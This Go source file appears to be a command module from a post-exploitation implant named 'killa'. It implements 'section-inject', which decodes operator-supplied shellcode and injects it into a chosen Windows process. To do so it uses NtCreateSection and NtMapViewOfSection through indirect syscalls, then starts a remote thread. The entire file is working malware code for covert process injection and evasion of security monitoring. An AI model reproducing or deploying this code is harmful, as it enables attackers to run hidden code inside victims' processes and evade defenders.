//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"killa/pkg/structs"
)

const (
	SECTION_ALL_ACCESS = 0x000F001F // STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE
)

// SectionInjectCommand implements the section-inject command
type SectionInjectCommand struct{}

func (c *SectionInjectCommand) Name() string {
	return "section-inject"
}

func (c *SectionInjectCommand) Description() string {
	return "Perform process injection using section objects (NtCreateSection/NtMapViewOfSection)"
}

type SectionInjectParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
}

func (c *SectionInjectCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params SectionInjectParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	output := "[*] Section Injection\n"
	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))

	if !IndirectSyscallsAvailable() {
		return errorResult(output + "[!] Section injection requires indirect syscalls, which are currently unavailable")
	}

	// 1. Open remote process
	var hProcess uintptr
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(params.PID))
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X\n", status))
	}
	defer procCloseHandle.Call(hProcess)
	output += "[+] Opened process handle\n"

	// 2. Create Section object backed by page file
	var hSection uintptr
	maxSize := uintptr(len(shellcode))

	// Create section: PAGE_EXECUTE_READWRITE allows RW mapping locally and RX mapping remotely
	status = IndirectNtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, &maxSize,
		uint32(PAGE_EXECUTE_READWRITE), uint32(0x8000000), 0) // SEC_COMMIT = 0x8000000
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtCreateSection failed: NTSTATUS 0x%X\n", status))
	}
	defer IndirectNtClose(hSection)
	output += fmt.Sprintf("[+] Created section object (handle: 0x%X)\n", hSection)

	// 3. Map view of section locally as RW
	var localBaseAddr uintptr
	var localViewSize uintptr

	status = IndirectNtMapViewOfSection(hSection, ^uintptr(0), &localBaseAddr, 0, 0, 0,
		&localViewSize, 1, 0, uint32(PAGE_READWRITE)) // ViewShare = 1
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtMapViewOfSection (Local) failed: NTSTATUS 0x%X\n", status))
	}
	output += fmt.Sprintf("[+] Mapped local view at 0x%X\n", localBaseAddr)

	// 4. Copy shellcode into local view
	var dest []byte
	header := (*syscall.SliceHeader)(unsafe.Pointer(&dest))
	header.Data = localBaseAddr
	header.Len = len(shellcode)
	header.Cap = len(shellcode)
	copy(dest, shellcode)
	output += "[+] Wrote shellcode to local section view\n"

	// 5. Unmap local view (optional but good hygiene)
	IndirectNtUnmapViewOfSection(^uintptr(0), localBaseAddr)

	// 6. Map view of section remotely as RX
	var remoteBaseAddr uintptr
	var remoteViewSize uintptr

	status = IndirectNtMapViewOfSection(hSection, hProcess, &remoteBaseAddr, 0, 0, 0,
		&remoteViewSize, 1, 0, uint32(PAGE_EXECUTE_READ))
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtMapViewOfSection (Remote) failed: NTSTATUS 0x%X\n", status))
	}
	output += fmt.Sprintf("[+] Mapped remote view at 0x%X (RX)\n", remoteBaseAddr)

	// 7. Create Remote Thread
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, remoteBaseAddr)
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status))
	}
	defer procCloseHandle.Call(hThread)
	output += fmt.Sprintf("[+] Created remote thread (handle: 0x%X)\n", hThread)
	output += "[+] Section injection completed successfully\n"

	return successResult(output)
}
